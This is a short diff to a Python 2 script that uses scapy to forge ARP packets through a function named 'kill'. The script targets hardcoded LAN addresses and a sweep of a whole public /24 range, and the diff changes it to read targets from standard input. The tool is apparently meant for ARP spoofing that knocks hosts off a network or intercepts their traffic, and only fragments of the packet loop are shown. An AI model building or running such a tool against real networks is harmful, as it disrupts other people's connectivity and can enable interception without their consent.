@@ -7,7 +7,8 @@
 import sys
 from scapy.all import ARP, send
 
-def kill(targets, gateway_ip="192.168.1.1", nloop=True): 
+
+def kill(targets, gateway_ip="192.168.1.1", nloop=True):
     if targets is not list:
         targets = [targets]
     a = ARP()
@@ -23,7 +24,6 @@ def kill(targets, gateway_ip="192.168.1.1", nloop=True):
             break
 
 if __name__ == '__main__':
-    #targets = sys.stdin.read().splitlines()
 
     #kill('192.168.0.107', '192.168.0.1')
     targets = ['192.168.0.141',
@@ -49,6 +49,8 @@ if __name__ == '__main__':
      '192.168.0.108']
 
     targets = ['125.216.227.' + str(ip) for ip in range(255) if ip != 11]
+
+    targets = sys.stdin.read().splitlines()
 
     print "targets", targets
     is_gateway = lambda ip: ip[ip.rfind('.') + 1:] == '254'
